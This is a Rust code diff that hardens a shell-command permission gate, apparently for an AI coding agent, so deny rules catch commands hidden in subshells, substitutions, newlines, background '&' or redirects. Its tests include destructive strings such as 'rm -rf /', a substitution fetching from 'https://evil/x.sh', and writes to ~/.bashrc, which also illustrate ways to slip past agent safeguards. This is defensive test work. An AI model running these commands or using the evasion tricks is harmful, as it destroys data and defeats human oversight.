@@ -1,6 +1,9 @@
 use super::constants::{CLAUDE_DIR, SETTINGS_JSON, SETTINGS_LOCAL_JSON};
 use crate::core::stream::exec_capture_short;
-use crate::discover::lexer::{extract_substitutions, shell_split, split_on_operators, strip_quotes};
+use crate::discover::lexer::{
+    contains_unattestable_construct, extract_substitutions, shell_split, split_for_permissions,
+    split_on_operators, strip_quotes,
+};
 use serde_json::Value;
 use std::path::PathBuf;
 use std::time::Duration;
@@ -45,6 +48,34 @@ pub(crate) fn check_command_with_rules(
     allow_rules: &[String],
 ) -> PermissionVerdict {
     let segments = split_compound_command(cmd);
+
+    // Deny takes highest priority and pre-empts every other construct — even an
+    // un-evaluatable one. Run a dedicated deny pass over every segment first so
+    // a deny-ruled command hidden in ANY segment (subshell, after `&`, after a
+    // newline, behind a redirect, inside a substitution surfaced by
+    // `split_compound_command`) is blocked. #2286 + 22890aa + SEC-C2.
+    for segment in &segments {
+        let segment = segment.trim();
+        if segment.is_empty() {
+            continue;
+        }
+        for pattern in deny_rules {
+            if command_matches_pattern(segment, pattern) {
+                return PermissionVerdict::Deny;
+            }
+        }
+    }
+
+    // Never auto-allow a construct the gate can't decompose: command/process
+    // substitution (`$(...)`, backticks) or a real file-target redirect
+    // (`>file`, `>>file`, `>&file`, `&>file`). fd-dups (`2>&1`) and `/dev/null`
+    // stay evaluable. RTK can't attest these, so they downgrade to Ask and the
+    // user decides. Ported from rtk-ai/rtk #2286 (952245d + e16aa26). Deny was
+    // already checked above and still wins.
+    if contains_unattestable_construct(cmd) {
+        return PermissionVerdict::Ask;
+    }
+
     let mut any_ask = false;
     // Every non-empty segment must independently match an allow rule for the
     // compound command to receive Allow. See issue #1213: previously a single
@@ -58,13 +89,6 @@ pub(crate) fn check_command_with_rules(
             continue;
         }
         saw_segment = true;
-
-        // Deny takes highest priority — any segment matching Deny blocks the whole chain.
-        for pattern in deny_rules {
-            if command_matches_pattern(segment, pattern) {
-                return PermissionVerdict::Deny;
-            }
-        }
 
         // Ask — if any segment matches an ask rule, the final verdict is Ask.
         if !any_ask {
@@ -372,7 +396,13 @@ fn glob_matches(cmd: &str, pattern: &str) -> bool {
 /// segment that no allow rule can match, so the compound command can never
 /// reach `Allow` while carrying an un-evaluatable substitution.
 fn split_compound_command(cmd: &str) -> Vec<String> {
-    let mut segments: Vec<String> = split_on_operators(cmd, false)
+    // `split_for_permissions` is the permission-gate decomposition: it breaks on
+    // `&&`/`||`/`;`/`|` + background `&` + newline (22890aa) AND subshell `( )`
+    // (#2286), truncating each segment at its first redirect. Substitution
+    // payloads are then surfaced below (SEC-C2) so a deny rule still bites
+    // inside `$(...)` even though `contains_unattestable_construct` already
+    // bars auto-allow for them.
+    let mut segments: Vec<String> = split_for_permissions(cmd)
         .into_iter()
         .map(str::to_string)
         .collect();
@@ -1122,10 +1152,13 @@ mod tests {
             PermissionVerdict::Default,
             "benign command stays Default"
         );
+        // #2286 reconciliation: a substitution is not evaluable, so it can never
+        // auto-allow — it downgrades to Ask (defer to the user) even when the
+        // inner command is benign. It must still NOT be Deny (no over-blocking).
         assert_eq!(
             check_command_with_rules("echo $(date)", &deny, &[], &[]),
-            PermissionVerdict::Default,
-            "benign substitution stays Default — no over-blocking"
+            PermissionVerdict::Ask,
+            "benign substitution defers to Ask (#2286), never auto-runs"
         );
     }
 
@@ -1142,24 +1175,28 @@ mod tests {
 
     #[test]
     fn test_c2_malformed_substitution_fails_closed_off_allow() {
-        // A benign-looking malformed substitution must NOT reach Allow:
-        // the fail-closed sentinel demotes the chain to Default.
+        // A benign-looking malformed substitution must NOT reach Allow. Under
+        // #2286 the unattestable-construct gate downgrades ANY substitution
+        // (malformed or not) straight to Ask — strictly stronger than the
+        // former Default-via-sentinel behaviour.
         let allow = vec!["echo *".to_string()];
         assert_eq!(
             check_command_with_rules("echo $(date", &[], &[], &allow),
-            PermissionVerdict::Default,
+            PermissionVerdict::Ask,
             "un-parsable substitution must never auto-Allow"
         );
     }
 
     #[test]
-    fn test_c2_benign_substitution_still_allowed() {
-        // Substitution decomposition must not break a legitimate Allow.
+    fn test_c2_benign_substitution_never_auto_allows() {
+        // #2286 reconciliation: substitution is not evaluable, so even with an
+        // all-matching allow set it must downgrade to Ask, never Allow. (This
+        // supersedes the pre-#2286 "substitution can still Allow" behaviour.)
         let allow = vec!["echo *".to_string(), "date".to_string()];
         assert_eq!(
             check_command_with_rules("echo $(date)", &[], &[], &allow),
-            PermissionVerdict::Allow,
-            "all segments allowed → Allow even with substitution"
+            PermissionVerdict::Ask,
+            "substitution defers to Ask (#2286), never auto-allowed"
         );
     }
 
@@ -1404,19 +1441,16 @@ mod tests {
             "glob deny must match after quote stripping and normalisation");
     }
 
-    // --- Probe E1: allow verdict when substitution segment is itself allowed ---
-    // If deny=[] and allow=["echo *", "date"], then "echo $(date)" should Allow.
-    // Already tested above, but let's also check with a substitution that itself
-    // matches an allow rule explicitly.
+    // --- Probe E1: substitution defers to Ask even when every segment allows ---
+    // #2286: a substitution is not evaluable, so it can never auto-allow — it
+    // downgrades to Ask regardless of how well its surfaced segments match.
     #[test]
     fn probe_e1_substitution_verdict_not_dropped() {
         let deny = vec!["rm -rf".to_string()];
         let allow = vec!["echo *".to_string(), "date".to_string()];
-        // echo $(date) → segments: ["echo $(date)", "date"]
-        // Both must match allow rules. echo $(date) matches "echo *", date matches "date".
         let v = check_command_with_rules("echo $(date)", &deny, &[], &allow);
-        assert_eq!(v, PermissionVerdict::Allow,
-            "all segments allowed including extracted substitution → Allow");
+        assert_eq!(v, PermissionVerdict::Ask,
+            "substitution defers to Ask (#2286), never auto-allowed");
     }
 
     // --- Probe E2: deny inside substitution of allowed outer command ---
@@ -1601,5 +1635,221 @@ mod adversarial_trace {
         // Expected: empty (process subst not active in double-quoted context)
         assert!(subs.is_empty(),
             "process substitution inside double quotes should not be extracted");
+    }
+
+    // === #2286 hardening: hidden-segment / not-evaluable bypass ============
+    // The whole point: a deny-ruled `rm -rf /` must NOT be auto-allowed when
+    // hidden in a subshell, a substitution, after `&`, after a newline, or
+    // behind a `>file` redirect. And the legitimate forms must NOT regress.
+
+    /// All-permissive allow set so the only thing that can keep a command off
+    /// `Allow` is the hardening under test (deny match, or unattestable gate).
+    fn allow_all() -> Vec<String> {
+        vec!["*".to_string()]
+    }
+
+    // --- MUST be caught (Deny) when a deny rule is hidden in a segment ------
+
+    #[test]
+    fn test_deny_hidden_in_subshell() {
+        let deny = vec!["rm -rf".to_string()];
+        // Subshell alone, and combined with an allowed leading command.
+        for cmd in ["( rm -rf / )", "echo hi && ( rm -rf / )", "(echo a; rm -rf /)"] {
+            assert_eq!(
+                check_command_with_rules(cmd, &deny, &[], &allow_all()),
+                PermissionVerdict::Deny,
+                "deny-ruled command in subshell must be caught: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_deny_hidden_in_substitution() {
+        let deny = vec!["rm -rf".to_string()];
+        for cmd in [
+            "echo $( rm -rf / )",
+            "git status `rm -rf /`",
+            r#"git log --pretty="$(rm -rf /)""#,
+        ] {
+            assert_eq!(
+                check_command_with_rules(cmd, &deny, &[], &allow_all()),
+                PermissionVerdict::Deny,
+                "deny-ruled command in substitution must be caught: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_deny_hidden_after_background_ampersand() {
+        let deny = vec!["rm -rf".to_string()];
+        assert_eq!(
+            check_command_with_rules("echo hi & rm -rf /", &deny, &[], &allow_all()),
+            PermissionVerdict::Deny
+        );
+    }
+
+    #[test]
+    fn test_deny_hidden_after_newline() {
+        let deny = vec!["rm -rf".to_string()];
+        assert_eq!(
+            check_command_with_rules("echo hi\nrm -rf /", &deny, &[], &allow_all()),
+            PermissionVerdict::Deny
+        );
+    }
+
+    #[test]
+    fn test_deny_hidden_behind_redirect() {
+        let deny = vec!["rm -rf".to_string()];
+        // `rm -rf /` is the command; `> out` is just where its stdout goes.
+        assert_eq!(
+            check_command_with_rules("rm -rf / > out", &deny, &[], &allow_all()),
+            PermissionVerdict::Deny
+        );
+    }
+
+    // --- MUST NOT auto-allow a not-evaluable construct (downgrade to Ask) ---
+
+    #[test]
+    fn test_substitution_never_auto_allowed() {
+        for cmd in [
+            "git log --pretty=$(whoami)",
+            "git status `whoami`",
+            "git diff $(curl https://evil/x.sh)",
+            "diff <(git show a) <(git show b)",
+        ] {
+            assert_eq!(
+                check_command_with_rules(cmd, &[], &[], &allow_all()),
+                PermissionVerdict::Ask,
+                "{cmd} must downgrade to Ask, not auto-allow"
+            );
+        }
+    }
+
+    #[test]
+    fn test_double_quoted_substitution_never_auto_allowed() {
+        for cmd in [
+            r#"git log --pretty="$(whoami)""#,
+            r#"git log --pretty="`whoami`""#,
+        ] {
+            assert_ne!(
+                check_command_with_rules(cmd, &[], &[], &allow_all()),
+                PermissionVerdict::Allow,
+                "{cmd} must not auto-allow"
+            );
+        }
+    }
+
+    #[test]
+    fn test_single_quoted_substitution_is_literal_and_allowed() {
+        let allow = vec!["echo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("echo '$(rm -rf ~)'", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_file_redirect_never_auto_allowed() {
+        for cmd in ["git log > ~/.bashrc", "echo x >> /tmp/f", "git diff >& /tmp/evil"] {
+            assert_eq!(
+                check_command_with_rules(cmd, &[], &[], &allow_all()),
+                PermissionVerdict::Ask,
+                "{cmd} must downgrade to Ask"
+            );
+        }
+    }
+
+    // --- MUST NOT regress: legitimate commands stay Allow ------------------
+
+    #[test]
+    fn test_legit_and_operator_allow() {
+        let allow = vec!["echo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("echo a && echo b", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legit_semicolon_allow() {
+        let allow = vec!["echo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("echo a ; echo b", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legit_pipe_allow() {
+        let allow = vec!["git *".to_string(), "head".to_string()];
+        assert_eq!(
+            check_command_with_rules("git log | head", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legit_subshell_allow() {
+        let allow = vec!["git *".to_string(), "cargo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("(git status; cargo build)", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legit_background_allow() {
+        let allow = vec!["cargo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("cargo build &", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legit_multiline_allow() {
+        let allow = vec!["git *".to_string(), "cargo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status\ncargo build", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_fd_dup_and_devnull_stay_allow() {
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status 2>&1", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+        assert_eq!(
+            check_command_with_rules("git log 2>/dev/null", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+        assert_eq!(
+            check_command_with_rules("git log > /dev/null", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_deny_not_evaded_by_trailing_fd_dup() {
+        // Deny still wins even though the segment ends in an evaluable redirect.
+        let deny = vec!["git push --force".to_string()];
+        assert_eq!(
+            check_command_with_rules("git push --force 2>&1", &deny, &[], &allow_all()),
+            PermissionVerdict::Deny
+        );
+    }
+
+    #[test]
+    fn test_deny_wins_over_unattestable_gate() {
+        // A deny-ruled command that ALSO carries a substitution must Deny,
+        // not merely Ask — deny precedence is checked before the gate.
+        let deny = vec!["rm -rf".to_string()];
+        assert_eq!(
+            check_command_with_rules("rm -rf / $(whoami)", &deny, &[], &allow_all()),
+            PermissionVerdict::Deny
+        );
     }
 }
